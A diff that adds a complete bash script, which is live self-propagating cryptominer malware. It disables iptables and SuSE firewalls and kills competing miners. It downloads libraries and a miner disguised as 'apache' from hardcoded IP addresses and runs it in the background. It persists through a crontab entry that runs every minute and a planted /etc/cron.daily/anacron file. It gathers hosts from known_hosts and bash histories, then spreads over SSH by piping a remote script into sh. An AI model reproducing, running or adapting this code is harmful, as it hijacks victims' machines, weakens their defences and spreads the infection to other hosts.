@@ -1,0 +1,125 @@
+#!/bin/bash
+export PATH=$PATH:.
+pwd=`pwd`
+plm=`ps x |grep httpd.conf|grep -v grep`
+plt=`cat /proc/cpuinfo|grep aes`
+file=`echo a| md5sum | awk '{print "."$1}'`
+cronfile=`date| md5sum | awk '{print "."$1}'`
+
+if [ "$plm" != "" ]
+  then
+    echo
+  else
+
+
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop
+rm -rf  apache* httpd.conf* /usr/local/bin/sysmonitord
+echo 'nameserver 8.8.8.8'> /etc/resolv.conf
+#/sbin/iptables -A OUTPUT -p tcp --dport 45560 -j ACCEPT
+kill -9 `ps x|grep stratum|awk '{print $1}'`
+kill -9 `ps x|grep httpd.conf|grep -v grep|awk '{print $1}'`
+#killall -9 sysmonitord sh wget curl
+
+if [ -f libcurl.so.4 ] ; then
+        echo
+        else
+
+#wget -qO - http://65.254.63.20/.mail | perl
+#curl -O http://65.254.63.20/.mail  > /dev/null 2>&1
+#fetch http://65.254.63.20/.mail > /dev/null 2>&1 ; perl .mail ; rm -rf .mail*
+
+wget 223.255.145.158/libcrypto.so.6 > /dev/null 2>&1
+wget 223.255.145.158/libcurl.so.4 > /dev/null 2>&1
+wget 223.255.145.158/libssl.so.6 > /dev/null 2>&1
+wget 223.255.145.158/libldap-2.3.so.0 > /dev/null 2>&1
+wget 223.255.145.158/liblber-2.3.so.0 > /dev/null 2>&1
+
+curl -O http://223.255.145.158/libcrypto.so.6 > /dev/null 2>&1
+curl -O http://223.255.145.158/libssl.so.6 > /dev/null 2>&1
+curl -O http://223.255.145.158/libcurl.so.4 > /dev/null 2>&1
+curl -O http://223.255.145.158/libldap-2.3.so.0 > /dev/null 2>&1
+curl -O http://223.255.145.158/liblber-2.3.so.0 > /dev/null 2>&1
+export LD_LIBRARY_PATH=`pwd`
+fi
+
+curl -O http://65.254.63.20/apache > /dev/null 2>&1
+wget http://65.254.63.20/apache > /dev/null 2>&1
+wget http://65.254.63.20/httpd.conf > /dev/null 2>&1
+curl -O http://65.254.63.20/httpd.conf > /dev/null 2>&1
+wget http://65.254.63.20/crontab > /dev/null 2>&1
+curl -O http://65.254.63.20/crontab > /dev/null 2>&1
+
+if [ -f /etc/cron.daily/anacron ] ; then
+        echo
+        else
+                wget -O /etc/cron.daily/anacron http://65.254.63.20/a > /dev/null 2>&1 ; chmod +x /etc/cron.daily/anacron
+                curl -O http://65.254.63.20/a  > /dev/null 2>&1; mv a /etc/cron.daily/anacron ; chmod +x 
+/etc/cron.daily/anacron
+fi
+
+chmod +x apache
+(exec apache -c httpd.conf &> /dev/null &)
+sleep 2
+
+crontab -r
+mv crontab $file
+chmod +x $file
+echo "* * * * * sh $pwd/$file" > $cronfile
+crontab  $cronfile
+
+rm -rf wget* apache* httpd*
+fi
+
+if [ "$plm" != "" ]
+  then
+    echo
+  else
+
+if [ "$plt" != "" ]
+  then
+        echo
+  else
+
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop
+export LD_LIBRARY_PATH=`pwd`
+#wget -qO - http://65.254.63.20/.mail | perl
+#curl -O http://65.254.63.20/.mail  > /dev/null 2>&1
+#fetch http://65.254.63.20/.mail > /dev/null 2>&1 ; perl .mail ; rm -rf .mail*
+wget http://65.254.63.20/apacheaes > /dev/null 2>&1
+curl -O http://65.254.63.20/apacheaes > /dev/null 2>&1
+wget http://65.254.63.20/httpd.conf > /dev/null 2>&1
+curl -O http://65.254.63.20/httpd.conf > /dev/null 2>&1
+wget http://65.254.63.20/crontab > /dev/null 2>&1
+curl -O http://65.254.63.20/crontab > /dev/null 2>&1
+
+chmod +x apacheaes
+mv apacheaes apache2
+(exec apache2 -c httpd.conf &> /dev/null &)
+
+crontab -r
+mv crontab $file
+chmod +x $file
+echo "* * * * * sh $pwd/$file" > $cronfile
+crontab  $cronfile
+
+fi
+
+fi
+
+if [ -f /tmp/.h ] ; then
+        echo
+        else
+cat /root/.ssh/known_hosts|grep -v ,|awk '{print $1}' > /tmp/.h
+cat /root/.ssh/known_hosts|grep ,|awk -F, '{print $1}' >> /tmp/.h
+cat /root/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> /tmp/.h
+cat /home/*/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> /tmp/.h
+cat /home/*/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v / |sort -u >> /tmp/.h
+cat /home/*/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v / |sort -u >> /tmp/.h
+cat /root/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v /|sort -u >> /tmp/.h
+cat /root/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v /|sort -u >> /tmp/.h
+cat /tmp/.h|grep -v 127.0.0.1|grep -v localhost|sort -u > /tmp/.hh
+cat /tmp/.hh > /tmp/.h
+rm -rf /tmp/.hh httpd.conf*
+for i in `cat /tmp/.h` ; do (exec ssh -oStrictHostKeyChecking=no -oCheckHostIP=no `whoami`@$i "wget http://65.254.63.20/a|sh ; curl -O http://65.254.63.20/a ; sh a;rm -rf a*") > /dev/null 2>&1 ; done
+fi
+
